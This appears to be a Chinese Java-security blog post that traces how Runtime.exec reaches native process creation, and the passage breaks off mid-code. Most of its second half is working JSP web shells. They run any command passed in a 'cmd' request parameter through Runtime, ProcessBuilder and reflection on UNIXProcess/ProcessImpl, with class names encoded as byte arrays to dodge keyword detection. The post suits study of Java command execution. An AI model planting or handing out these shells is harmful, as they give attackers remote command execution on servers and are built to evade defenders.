<h5 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h5><p>中间两个重载方法同上，只是command参数变成了直接接受cmdarray数组，中间会调用cmdarray的处理方法，暂时先不看</p>
<h5 id="java-lang-Runtime-java-620"><a href="#java-lang-Runtime-java-620" class="headerlink" title="java.lang.Runtime.java:620"></a>java.lang.Runtime.java:620</h5><p>接下来来到重点最后一个重载方法</p>
<img src="/image/image-20221027205843270.png" alt="image-20221027205843270" style="zoom:80%;" />

<p>上面的方法return到最后一个重载方法，此时准备好调用<code>ProcessBuilder</code>类创建process</p>
<blockquote>
<p>Process类将持有该程序返回 Java VM 的引用。这个procss类是一个抽象类，具体子类的实现依赖于不同的底层操作系统。</p>
</blockquote>
<p>而这个process类型需要通过<code>ProcessBuilder.start()</code>方法进行创建</p>
<h5 id="java-lang-ProcessBuilder-java-1029"><a href="#java-lang-ProcessBuilder-java-1029" class="headerlink" title="java.lang.ProcessBuilder.java:1029"></a>java.lang.ProcessBuilder.java:1029</h5><p>跟进到<code>ProcessBuilder.start()</code>方法，通过上面的步骤对cmdarray数组进行解析，取出cmdarray[0]赋值给prog,如果安全管理器SecurityManager开启,会调用SecurityManager#checkExec()对执行程序prog进行检查，检查通过后调用<code>ProcessImpl</code>类的<code>start</code>方法</p>
<img src="/image/image-20221027210543220.png" alt="image-20221027210543220" style="zoom:80%;" />

<img src="/image/image-20221027184930398.png" alt="image-20221027184930398" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-87"><a href="#java-lang-ProcessImpl-java-87" class="headerlink" title="java.lang.ProcessImpl.java:87"></a>java.lang.ProcessImpl.java:87</h5><p>跟进到<code>java.lang.ProcessImpl.java</code>，根据官方注释，<code>ProcessImpl</code>类仅用于<code>ProcessBuilder.start()</code>创建新Process</p>
<img src="/image/image-20221027185711455.png" alt="image-20221027185711455" style="zoom:80%;" />

<p>我们继续跟进到<code>ProcessBuilder.start()</code>方法，Windows下会调用<code>ProcessImpl</code>类的构造方法，如果是Linux环境，则会调用<code>java.lang.UNIXProcess#init&lt;&gt;</code></p>
<img src="/image/image-20221027190106915.png" alt="image-20221027190106915" style="zoom:80%;" />

<img src="/image/image-20221027190208801.png" alt="image-20221027190208801" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-314"><a href="#java-lang-ProcessImpl-java-314" class="headerlink" title="java.lang.ProcessImpl.java:314"></a>java.lang.ProcessImpl.java:314</h5><p>这里以Windows为例，跟进<code>ProcessImpl</code>类构造方法</p>
<img src="/image/image-20221027213622591.png" alt="image-20221027213622591" style="zoom:80%;" />

<p>构造方法内，通过<code>SecurityManager</code>类进行安全校验，通过<code>allowAmbiguousCommands</code>变量作为是否允许调用本地进程的开关，只有当两种检查都通过的时候，则进入<code>Legacy mode(传统模式)</code></p>
<img src="/image/image-20221027214049982.png" alt="image-20221027214049982" style="zoom:80%;" />

<p>传统模式调用<code>needsEscaping</code>，这一步是为了对没有被双引号包裹的空格进行处理，最后通过<code>createCommandLine</code>拼接成字符串</p>
<img src="/image/image-20221027215149974.png" alt="image-20221027215149974" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-386"><a href="#java-lang-ProcessImpl-java-386" class="headerlink" title="java.lang.ProcessImpl.java:386"></a>java.lang.ProcessImpl.java:386</h5><p>最后通过<code>ProcessImpl.create</code>方法创建进程</p>
<img src="/image/image-20221027215720601.png" alt="image-20221027215720601" style="zoom:80%;" />

<h5 id="ProcessImpl-create"><a href="#ProcessImpl-create" class="headerlink" title="ProcessImpl.create"></a>ProcessImpl.create</h5><p>这是一个Native方法（Java调用非Java代码的接口），根据JNI命名规则，会调用<code>ProcessImpl_md.c</code>中的<code>Java_Java_lang_ProcessImpl_create</code>，我们来看看<code>ProcessImpl_md.c</code>的源码</p>
<blockquote>
<p>ProcessImpl_md.c源码：</p>
<p><a href="http://hg.openjdk.java.net/lambda/lambda/jdk/file/e6aeeec33e53/src/windows/native/java/lang/ProcessImpl_md.c">http://hg.openjdk.java.net/lambda/lambda/jdk/file/e6aeeec33e53/src/windows/native/java/lang/ProcessImpl_md.c</a></p>
</blockquote>
<img src="/image/image-20221027221338125.png" alt="image-20221027221338125" style="zoom:80%;" />

<p>可以看到接受来自java的参数，而在216行，我们可以看到调用了Windows的api函数<code>CreateProcessW()</code>，他的作用是用来创建一个Windows进程</p>
<img src="/image/image-20221027221423618.png" alt="image-20221027221423618" style="zoom:80%;" />

<p>我们来看看Windows官方的定义</p>
<blockquote>
<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</a></p>
</blockquote>
<img src="/image/image-20221027221931223.png" alt="image-20221027221931223" style="zoom: 50%;" />

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>通过观察上面的整个流程，我们可以总结出<code>Runtime.exec</code>的整个调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入参数</span></span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//六个重载函数，根据传入不同的数据类型和参数个数进入，最终都处理成‘String[] cmdarray, String[] envp, File dir’的形式，调用最后一个重载函数</span></span><br><span class="line">java.lang.Runtime.java:<span class="number">620</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//调用ProcessBuilder类的start函数</span></span><br><span class="line">java.lang.ProcessBuilder.java:<span class="number">1029</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//根据操作系统类区分，如果是Windows则进入ProcessImpl类的构造方法，如果是Linux则调用java.lang.UNIXProcess#init&lt;&gt;；以Windows为例</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Windows下调用cmd"><a href="#Windows下调用cmd" class="headerlink" title="Windows下调用cmd"></a>Windows下调用cmd</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd = &#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h4 id="Linux下调用-bin-bash"><a href="#Linux下调用-bin-bash" class="headerlink" title="Linux下调用&#x2F;bin&#x2F;bash"></a>Linux下调用&#x2F;bin&#x2F;bash</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h4 id="根据系统选择合适的解释器"><a href="#根据系统选择合适的解释器" class="headerlink" title="根据系统选择合适的解释器"></a>根据系统选择合适的解释器</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Java本地命令执行"><a href="#Java本地命令执行" class="headerlink" title="Java本地命令执行"></a>Java本地命令执行</h2><p>Java原生提供了对本地系统命令执行的支持，黑客通常会<code>RCE利用漏洞</code>或者<code>WebShell</code>来执行系统终端命令控制服务器的目的。</p>
<p>对于开发者来说执行本地命令来实现某些程序功能(如:ps 进程管理、top内存管理等)是一个正常的需求，而对于黑客来说<code>本地命令执行</code>是一种非常有利的入侵手段。</p>
<h3 id="Runtime命令执行测试"><a href="#Runtime命令执行测试" class="headerlink" title="Runtime命令执行测试"></a>Runtime命令执行测试</h3><h4 id="runtime-exec2-jsp"><a href="#runtime-exec2-jsp" class="headerlink" title="runtime-exec2.jsp"></a>runtime-exec2.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709170039712.png" alt="image-20230709170039712" style="zoom:80%;" />

<p>这样执行命令没有回显，我们可以通过字节输入流读取回显结果</p>
<h4 id="runtime-exec-jsp"><a href="#runtime-exec-jsp" class="headerlink" title="runtime-exec.jsp"></a>runtime-exec.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">  <span class="type">int</span> a;</span><br><span class="line">  <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">while</span> ((a = in.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    baos.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">  &#125;</span><br><span class="line">  out.write(<span class="string">&quot;命令结果：\n&quot;</span> + baos);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709180804827.png" alt="image-20230709180804827" style="zoom:80%;" />

<h5 id="Runtime-exec调用链"><a href="#Runtime-exec调用链" class="headerlink" title="Runtime.exec调用链"></a>Runtime.exec调用链</h5><p><code>Runtime.exec(xxx)</code>调用链如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.jsp.runtime_002dexec_jsp._jspService(runtime_002dexec_jsp:<span class="number">114</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">347</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">450</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">620</span>)</span><br><span class="line">java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="number">1029</span>)</span><br><span class="line">java.lang.ProcessImpl.start(ProcessImpl.java:<span class="number">134</span>)</span><br><span class="line"><span class="comment">//如果是Linux则继续跟进</span></span><br><span class="line">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="number">247</span>)</span><br></pre></td></tr></table></figure>

<p>通过观察整个调用链我们可以清楚的看到<code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p>
<ol>
<li><code>Runtime.exec(xxx)</code></li>
<li><code>java.lang.ProcessBuilder.start()</code></li>
<li><code>new java.lang.UNIXProcess(xxx)</code></li>
<li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec(xxx)</code> native方法。</li>
<li><code>forkAndExec</code>调用操作系统级别<code>fork</code>-&gt;<code>exec</code>(*nix)&#x2F;<code>CreateProcess</code>(Windows)执行命令并返回<code>fork</code>&#x2F;<code>CreateProcess</code>的<code>PID</code>。</li>
</ol>
<p>有了以上的调用链分析我们就可以深刻的理解到Java本地命令执行的深入逻辑了，切记<code>Runtime</code>和<code>ProcessBuilder</code>并不是程序的最终执行点!</p>
<h3 id="JSP反射Runtime类命令执行"><a href="#JSP反射Runtime类命令执行" class="headerlink" title="JSP反射Runtime类命令执行"></a>JSP反射Runtime类命令执行</h3><p>如果我们不希望在代码中出现和<code>Runtime</code>相关的关键字，我们可以全部用反射代替。</p>
<h4 id="reflect-cmd-jsp"><a href="#reflect-cmd-jsp" class="headerlink" title="reflect-cmd.jsp"></a>reflect-cmd.jsp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//定义request接收的参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义&quot;java.lang.Runtime&quot;字节变量，隐藏Runtime关键字</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取Runtime类对象</span></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(rt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取getRuntime方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_getRuntime</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取exec方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_exec</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;),String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射调用Runtime.getRuntime.exec()方法</span></span><br><span class="line">    <span class="comment">//Object object_getRuntime = method_getRuntime.invoke(null);</span></span><br><span class="line">    <span class="comment">//Object object_exec = method_exec.invoke(object_getRuntime, str);</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> method_exec.invoke(method_getRuntime.invoke(<span class="literal">null</span>), str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取Process类的getInputStream方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method_getInputStream</span> <span class="operator">=</span> object.getClass().getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>&#125;));</span><br><span class="line">    method_getInputStream.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>((InputStream) method_getInputStream.invoke(object, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    out.write(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a>ProcessBuilder命令执行</h3><p>学习<code>Runtime</code>命令执行的时候我们讲到其最终<code>exec</code>方法会调用<code>ProcessBuilder</code>来执行本地命令，那么我们只需跟踪下Runtime的exec方法就可以知道如何使用<code>ProcessBuilder</code>来执行系统命令了。</p>
<h4 id="process-builder-jsp"><a href="#process-builder-jsp" class="headerlink" title="process-builder.jsp"></a>process-builder.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">//注意此处用了request.getParameterValues方法，因为ProcessBuilder只能接收字符数组</span></span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(request.getParameterValues(<span class="string">&quot;cmd&quot;</span>)).start().getInputStream();</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((a = in.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    baos.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  out.write(baos.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709215015163.png" alt="image-20230709215015163" style="zoom:80%;" />

<h3 id="JSP反射ProcessBuilder类命令执行"><a href="#JSP反射ProcessBuilder类命令执行" class="headerlink" title="JSP反射ProcessBuilder类命令执行"></a>JSP反射ProcessBuilder类命令执行</h3><h4 id="reflect-processbuilder-jsp"><a href="#reflect-processbuilder-jsp" class="headerlink" title="reflect-processbuilder.jsp"></a>reflect-processbuilder.jsp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">//接收request数组对象</span></span><br><span class="line">  <span class="type">Object</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取java.lang.ProcessBuilder类</span></span><br><span class="line">  <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>&#125;));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取有参构造器</span></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(String[].class);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射获取start方法</span></span><br><span class="line">  <span class="type">Method</span> <span class="variable">method_start</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//实例化获取对象</span></span><br><span class="line">  <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> method_start.invoke(object);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//反射执行getInputStream方法</span></span><br><span class="line">  <span class="type">Method</span> <span class="variable">method_getInputStream</span> <span class="operator">=</span> object2.getClass().getDeclaredMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">  method_getInputStream.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//输出结果</span></span><br><span class="line">  <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>((InputStream) method_getInputStream.invoke(object2, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  out.write(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="UNIXProcess-ProcessImpl"><a href="#UNIXProcess-ProcessImpl" class="headerlink" title="UNIXProcess&#x2F;ProcessImpl"></a>UNIXProcess&#x2F;ProcessImpl</h3><p><code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p>
<p><code>UNIXProcess</code>类的<code>forkAndExec</code>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">forkAndExec</span><span class="params">(<span class="type">int</span> mode, <span class="type">byte</span>[] helperpath,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] prog,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] argBlock, <span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] envBlock, <span class="type">int</span> envc,</span></span><br><span class="line"><span class="params">                                   <span class="type">byte</span>[] dir,</span></span><br><span class="line"><span class="params">                                   <span class="type">int</span>[] fds,</span></span><br><span class="line"><span class="params">                                   <span class="type">boolean</span> redirectErrorStream)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<h3 id="反射UNIXProcess-ProcessImpl执行本地命令"><a href="#反射UNIXProcess-ProcessImpl执行本地命令" class="headerlink" title="反射UNIXProcess&#x2F;ProcessImpl执行本地命令"></a>反射UNIXProcess&#x2F;ProcessImpl执行本地命令</h3><h4 id="reflect-processimpl-jsp"><a href="#reflect-processimpl-jsp" class="headerlink" title="reflect-processimpl.jsp"></a>reflect-processimpl.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="type">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes  = s.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>, result, <span class="number">0</span>, bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputStream <span class="title function_">start</span><span class="params">(String[] strs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// java.lang.UNIXProcess</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">unixClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">88</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// java.lang.ProcessImpl</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射创建UNIXProcess或者ProcessImpl</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(unixClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            clazz = Class.forName(processClass);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> strs != <span class="literal">null</span> &amp;&amp; strs.length &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">        <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc    = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span 